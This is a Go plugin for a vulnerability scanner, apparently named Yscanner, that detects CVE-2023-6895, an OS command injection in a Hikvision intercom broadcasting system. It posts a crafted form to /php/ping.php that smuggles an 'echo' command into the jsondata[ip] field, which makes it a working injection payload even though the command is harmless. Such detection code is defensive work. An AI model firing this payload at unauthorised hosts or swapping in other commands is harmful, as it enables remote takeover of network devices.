package goplugin

import (
	"Yscanner/utils"
	"bytes"
	"net/http"
	"strings"
)

func init() {
	Register("hikvision_ping_rce_cve_2023_6895", &hikvision_ping_rce_cve_2023_6895{})
}

type hikvision_ping_rce_cve_2023_6895 struct{}

func (p *hikvision_ping_rce_cve_2023_6895) Info() PluginInfo {
	return PluginInfo{
		Name:     "Hikvision对讲广播系统 ping.php 操作系统命令注入",
		VulnInfo: "在 Hikvision Intercom Broadcasting System 3.0.3_20201113_RELEASE(HIK) 中发现了一处漏洞。该漏洞影响文件 /php/ping.php 的未知代码。攻击者可以通过篡改参数 jsondata[ip] 中的输入实现操作系统命令注入。",
		VulnID:   "CVE-2023-6895",
		Level:    "9.8 CRITICAL",
		URL:      "",
		Version:  "version < 4.1.0",
		CWE:      "CWE-78	OS命令注入",
	}
}

func (p *hikvision_ping_rce_cve_2023_6895) Check(netloc string) bool {
	randstr := utils.GenRandom(10)
	paylaod := "jsondata%5Btype%5D=99&jsondata%5Bip%5D=echo%20" + randstr

	req, err := http.NewRequest("POST", netloc+"/php/ping.php", bytes.NewBufferString(paylaod))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}

	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, randstr) {
		return true
	}
	return false
}
